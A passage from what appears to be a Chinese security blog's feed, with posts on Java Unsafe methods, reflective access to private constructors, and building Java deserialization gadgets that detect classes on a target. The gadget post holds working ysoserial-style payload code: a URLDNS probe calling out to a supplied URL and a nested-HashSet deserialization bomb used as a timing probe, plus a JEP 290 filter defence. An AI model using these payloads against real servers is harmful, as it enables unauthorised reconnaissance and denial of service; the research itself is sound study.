class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(getBytes(simplePrincipalCollection), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes(Object obj) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>密钥✅的情况：<br><img src="images/image-20221024055251820.png" alt="image-20221024055251820"></p><p>密钥❎的情况：<br><img src="images/image-20221024055335648.png" alt="image-20221024055335648"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>unsafe学习</title>
      <link href="/2022/11/10/unsafe%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/11/10/unsafe%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="unsafe学习"><a href="#unsafe学习" class="headerlink" title="unsafe学习"></a>unsafe学习</h1><h2 id="获取偏移量方法"><a href="#获取偏移量方法" class="headerlink" title="获取偏移量方法"></a>获取偏移量方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">objectFieldOffset</span><span class="params">(Field var1)</span>;<span class="comment">//获取非静态变量var1的偏移量。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">staticFieldOffset</span><span class="params">(Field var1)</span>;<span class="comment">//获取静态变量var1的偏移量。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">arrayBaseOffset</span><span class="params">(Class&lt;?&gt; var1)</span>;<span class="comment">//获取数组var1中的第一个元素的偏移量，即数组的基础地址。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">staticFieldBase</span><span class="params">(Field var1)</span>;<span class="comment">//获取静态变量var1的实际地址，配合staticFieldOffset方法使用，可求出变量所在的段地址</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">arrayIndexScale</span><span class="params">(Class&lt;?&gt; var1)</span>;<span class="comment">//获取数组var1的偏移量增量。结合arrayBaseOffset(Class&lt;?&gt; var1)方法就可以求出数组中各个元素的地址。</span></span><br></pre></td></tr></table></figure><h2 id="操作属性方法"><a href="#操作属性方法" class="headerlink" title="操作属性方法"></a>操作属性方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">getObject</span><span class="params">(Object var1, <span class="type">long</span> var2)</span>;<span class="comment">//获取var1对象中偏移量为var2的Object对象，该方法可以无视修饰符限制。相同方法有getInt、getLong、getBoolean等。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putObject</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4)</span>;<span class="comment">//将var1对象中偏移量为var2的Object对象的值设为var4，该方法可以无视修饰符限制。相同的方法有putInt、putLong、putBoolean等。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">getObjectVolatile</span><span class="params">(Object var1, <span class="type">long</span> var2)</span>;<span class="comment">//功能与getObject(Object var1, long var2)一样，但该方法可以保证读写的可见性和有序性，可以无视修饰符限制。相同的方法有getIntVolatile、getLongVolatile、getBooleanVolatile等。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putObjectVolatile</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4)</span>;<span class="comment">//功能与putObject(Object var1, long var2, Object var4)一样，但该方法可以保证读写的可见性和有序性，可以无视修饰符限制。相同的方法有putIntVolatile、putLongVolatile、putBooleanVolatile等。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putOrderedObject</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4)</span>;<span class="comment">//功能与putObject(Object var1, long var2, Object var4)一样，但该方法可以保证读写的有序性(不保证可见性)，可以无视修饰符限制。相同的方法有putOrderedInt、putOrderedLong等。</span></span><br></pre></td></tr></table></figure><h2 id="操作内存方法"><a href="#操作内存方法" class="headerlink" title="操作内存方法"></a>操作内存方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">addressSize</span><span class="params">()</span>;<span class="comment">//获取本地指针大小，单位为byte，通常值为4或8。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">pageSize</span><span class="params">()</span>;<span class="comment">//获取本地内存的页数，该返回值会是2的幂次方。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">allocateMemory</span><span class="params">(<span class="type">long</span> var1)</span>;<span class="comment">//开辟一块新的内存块，大小为var1(单位为byte)，返回新开辟的内存块地址。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">reallocateMemory</span><span class="params">(<span class="type">long</span> var1, <span class="type">long</span> var3)</span>;<span class="comment">//将内存地址为var3的内存块大小调整为var1(单位为byte)，返回调整后新的内存块地址。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">setMemory</span><span class="params">(<span class="type">long</span> var2, <span class="type">long</span> var4, <span class="type">byte</span> var6)</span>;<span class="comment">//从实际地址var2开始将后面的字节都修改为var6，修改大小为var4(通常为0)。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">copyMemory</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4, <span class="type">long</span> var5, <span class="type">long</span> var7)</span>;<span class="comment">//从对象var1中偏移量为var2的地址开始复制，复制到var4中偏移量为var5的地址，复制大小为var7。当var1为空时，var2就不是偏移量而是实际地址，当var4为空时，var5就不是偏移量而是实际地址。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">freeMemory</span><span class="params">(<span class="type">long</span> var1)</span>;<span class="comment">//释放实际地址为var1的内存。</span></span><br></pre></td></tr></table></figure><h2 id="线程挂起和恢复方法"><a href="#线程挂起和恢复方法" class="headerlink" title="线程挂起和恢复方法"></a>线程挂起和恢复方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">unpark</span><span class="params">(Object var1)</span>;<span class="comment">//将被挂起的线程var1恢复，由于其不安全性，需保证线程var1是存活的。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">park</span><span class="params">(<span class="type">boolean</span> var1, <span class="type">long</span> var2)</span>;<span class="comment">//当var2等于0时，线程会一直挂起，知道调用unpark方法才能恢复。当var2大于0时，如果var1为false，这时var2为增量时间，即线程在被挂起var2秒后会自动恢复，如果var1为true，这时var2为绝对时间，即线程被挂起后，得到具体的时间var2后才自动恢复。</span></span><br></pre></td></tr></table></figure><h2 id="CAS方法"><a href="#CAS方法" class="headerlink" title="CAS方法"></a>CAS方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">compareAndSwapObject</span><span class="params">(Object var1, <span class="type">long</span> var2, Object var4, Object var5)</span>;<span class="comment">//CAS机制相关操作，对对象var1里偏移量为var2的变量进行CAS修改，var4为期待值，var5为修改值，返回修改结果。相同方法有compareAndSwapInt、compareAndSwapLong。</span></span><br></pre></td></tr></table></figure><h2 id="类加载方法"><a href="#类加载方法" class="headerlink" title="类加载方法"></a>类加载方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">shouldBeInitialized</span><span class="params">(Class&lt;?&gt; var1)</span>;<span class="comment">//判断var1类是否被初始。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">ensureClassInitialized</span><span class="params">(Class&lt;?&gt; var1)</span>;<span class="comment">//确保var1类已经被初始化。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineClass(String var1, <span class="type">byte</span>[] var2, <span class="type">int</span> var3, <span class="type">int</span> var4, ClassLoader var5, ProtectionDomain var6);<span class="comment">//定义一个类，用于动态的创建类。var1为类名，var2为类的文件数据字节数组，var3为var2的输入起点，var4为输入长度，var5为加载该类的加载器，var6为保护领域。返回创建后的类。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineAnonymousClass(Class&lt;?&gt; var1, <span class="type">byte</span>[] var2, Object[] var3);<span class="comment">//用于动态的创建匿名内部类。var1为需创建匿名内部类的类，var2为匿名内部类的文件数据字节数组，var3为修补对象。返回创建后的匿名内部类。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">allocateInstance</span><span class="params">(Class&lt;?&gt; var1)</span> <span class="keyword">throws</span> InstantiationException;<span class="comment">//创建var1类的实例，但是不会调用var1类的构造方法，如果var1类还没有初始化，则进行初始化。返回创建实例对象。</span></span><br></pre></td></tr></table></figure><h2 id="内存屏障方法"><a href="#内存屏障方法" class="headerlink" title="内存屏障方法"></a>内存屏障方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">loadFence</span><span class="params">()</span>;<span class="comment">//所有读操作必须在loadFence方法执行前执行完毕。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">storeFence</span><span class="params">()</span>;<span class="comment">//所有写操作必须在storeFence方法执行前执行完毕。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">fullFence</span><span class="params">()</span>;<span class="comment">//所有读写操作必须在fullFence方法执行前执行完毕。</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.cnblogs.com/gaofei200/p/13951764.html">https://www.cnblogs.com/gaofei200/p/13951764.html</a></p><p><a href="https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html">https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>反射newInstance的使用方式</title>
      <link href="/2022/11/10/%E5%8F%8D%E5%B0%84newInstance%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
      <url>/2022/11/10/%E5%8F%8D%E5%B0%84newInstance%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="反射newInstance的使用方式"><a href="#反射newInstance的使用方式" class="headerlink" title="反射newInstance的使用方式"></a>反射newInstance的使用方式</h1><p>通过反射创建新的类示例，有两种方式：<br><code>Class.newInstance()</code><br><code>Constructor.newInstance()</code></p><hr><p>以下对两种调用方式给以比较说明：<br><code>Class.newInstance()</code> <strong>只能够调用无参的构造函数，即默认的构造函数；</strong><br><code>Class.newInstance()</code> <strong>要求被调用的构造函数是可见的，也即必须是public类型的;</strong> </p><hr><p><code>Constructor.newInstance()</code> <strong>可以根据传入的参数，调用任意构造构造函数。</strong> </p><p><code>Constructor.newInstance()</code> <strong>在特定的情况下，可以调用私有的构造函数。</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();<span class="comment">//获得构造函数</span></span><br><span class="line">m.setAccessible(<span class="literal">true</span>);<span class="comment">//设置构造函数为可访问</span></span><br></pre></td></tr></table></figure><hr><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect.newInstance;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;A&#x27;s constructor is called.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">A</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;a:&quot;</span> + a + <span class="string">&quot; b:&quot;</span> + b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect.newInstance;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        B b=<span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;通过Class.NewInstance()调用私有构造函数:&quot;</span>);</span><br><span class="line">        b.newInstanceByClassNewInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot;通过Constructor.newInstance()调用私有构造函数:&quot;</span>);</span><br><span class="line">        b.newInstanceByConstructorNewInstance();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*通过Class.NewInstance()创建新的类示例*/</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">newInstanceByClassNewInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">/*当前包名为reflect，必须使用全路径*/</span></span><br><span class="line">            A a=(A)Class.forName(<span class="string">&quot;reflect.newInstance.A&quot;</span>).newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;通过Class.NewInstance()调用私有构造函数【失败】&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*通过Constructor.newInstance()创建新的类示例*/</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">newInstanceByConstructorNewInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">/*可以使用相对路径，同一个包中可以不用带包路径*/</span></span><br><span class="line">            Class c=Class.forName(<span class="string">&quot;reflect.newInstance.A&quot;</span>);</span><br><span class="line">            <span class="comment">/*以下调用无参的、私有构造函数*/</span></span><br><span class="line">            Constructor c0=c.getDeclaredConstructor();</span><br><span class="line">            c0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            A a0=(A)c0.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*以下调用带参的、私有构造函数*/</span></span><br><span class="line">            Constructor c1=c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">int</span>.class,<span class="type">int</span>.class&#125;);</span><br><span class="line">            c1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            A a1=(A)c1.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="number">5</span>, <span class="number">6</span>&#125;);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>构造Java探测class反序列化gadget的思考</title>
      <link href="/2022/11/10/%E6%9E%84%E9%80%A0java%E6%8E%A2%E6%B5%8Bclass%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2022/11/10/%E6%9E%84%E9%80%A0java%E6%8E%A2%E6%B5%8Bclass%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h1 id="构造java探测class反序列化gadget的思考"><a href="#构造java探测class反序列化gadget的思考" class="headerlink" title="构造java探测class反序列化gadget的思考"></a>构造java探测class反序列化gadget的思考</h1><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&amp;mid=2247484178&amp;idx=1&amp;sn=228ccc3d624f2d64a6c1d51555c42eea&amp;chksm=cf36fb52f8417244ea608ea14da45b876548617864179c8da6df46010bed78aa41c4a2277cb8&amp;mpshare=1&amp;scene=23&amp;srcid=1231zSEsxQMxcrllvqoBgmcY&amp;sharer_sharetime=1640932147710&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">构造java探测class反序列化gadget</a></p><p>这篇文章是2021年最后一天读的，非常好。这让我对2022充满希望。谢谢师傅提供的好思路。</p><h2 id="urldns"><a href="#urldns" class="headerlink" title="urldns"></a>urldns</h2><p>通过urldns去判断是不是存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 生成我们需要的空类</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title function_">makeClass</span><span class="params">(String clazzName)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(clazzName);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">    ctClass.defrost();</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Authors(&#123; Authors.NOPOINT,Authors.C0NY1 &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FindClassByDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmds = command.split(<span class="string">&quot;\\|&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(cmds.length != <span class="number">2</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;&lt;url&gt;|&lt;class name&gt;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> cmds[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">clazzName</span> <span class="operator">=</span> cmds[<span class="number">1</span>];</span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line">        <span class="comment">// 以URL对象为key，以探测Class为value</span></span><br><span class="line">        ht.put(u, makeClass(clazzName));<span class="comment">//</span></span><br><span class="line">        Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> ht;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如果环境没有dns解析就不行咯</strong></p><h2 id="Dos"><a href="#Dos" class="headerlink" title="Dos"></a>Dos</h2><p><a href="https://blog.csdn.net/fnmsd/article/details/115672540">https://blog.csdn.net/fnmsd/article/details/115672540</a></p><p><a href="https://blog.csdn.net/nevermorewo/article/details/100100048">https://blog.csdn.net/nevermorewo/article/details/100100048</a></p><p><a href="https://github.com/jbloch/effective-java-3e-source-code/blob/master/src/effectivejava/chapter12/item85/DeserializationBomb.java">https://github.com/jbloch/effective-java-3e-source-code/blob/master/src/effectivejava/chapter12/item85/DeserializationBomb.java</a></p><p><strong>通过构造特殊的多层嵌套HashSet，导致服务器反序列化的时间复杂度提升，消耗服务器所有性能，导致拒绝服务。在这个基础上，我选择消耗部分性能达到间接延时的作用，来探测class。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Authors(&#123; Authors.C0NY1 &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FindClassByBomb</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> depth;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(command.contains(<span class="string">&quot;|&quot;</span>))&#123;</span><br><span class="line">            String[] x = command.split(<span class="string">&quot;\\|&quot;</span>);</span><br><span class="line">            className = x[<span class="number">0</span>];</span><br><span class="line">            depth = Integer.valueOf(x[<span class="number">1</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            className = command;</span><br><span class="line">            depth = <span class="number">28</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">findClazz</span> <span class="operator">=</span> makeClass(className);</span><br><span class="line">        Set&lt;Object&gt; root = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">        Set&lt;Object&gt; s1 = root;</span><br><span class="line">        Set&lt;Object&gt; s2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; depth; i++) &#123;</span><br><span class="line">            Set&lt;Object&gt; t1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">            Set&lt;Object&gt; t2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">            t1.add(findClazz);<span class="comment">//不存在类就抛出异常</span></span><br><span class="line">            s1.add(t1);</span><br><span class="line">            s1.add(t2);</span><br><span class="line">            s2.add(t1);</span><br><span class="line">            s2.add(t2);</span><br><span class="line">            s1 = t1;</span><br><span class="line">            s2 = t2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>经过师傅的实战一般这个深度都在25到28之间，切记不要设置太大否则造成DOS。</p><p>不过可以通过jep290继续防御</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djdk.serialFilter=maxarray=100000;maxdepth=20</span><br></pre></td></tr></table></figure><h2 id="class-checklist"><a href="#class-checklist" class="headerlink" title="class checklist"></a>class checklist</h2><p>要想在实战中使用，我们就需要事先去制作一份class的checklist备用。下面我通过diff maven中央仓库的统计的结果。最新的checklist和gadget都更新到ysoserial-for-woodpecker项目。</p><p><strong>6.1 CommonsCollections</strong></p><p>必须存在类：org.apache.commons.collections.functors.ChainedTransformer</p><div class="table-container"><table><thead><tr><th style="text-align:center">版本范围</th><th style="text-align:center">漏洞版本</th><th style="text-align:center">判断类</th><th style="text-align:center">suid冲突</th></tr></thead><tbody><tr><td style="text-align:center">&gt;= 3.1 or = 20040616</td><td style="text-align:center">org.apache.commons.collections.list.TreeList</td><td style="text-align:center">是</td><td style="text-align:center">无</td></tr><tr><td style="text-align:center">&gt;= 3.2.2</td><td style="text-align:center">org.apache.commons.collections.functors.FunctorUtils$1</td><td style="text-align:center">否</td><td style="text-align:center">无</td></tr></tbody></table></div><p><strong>6.2 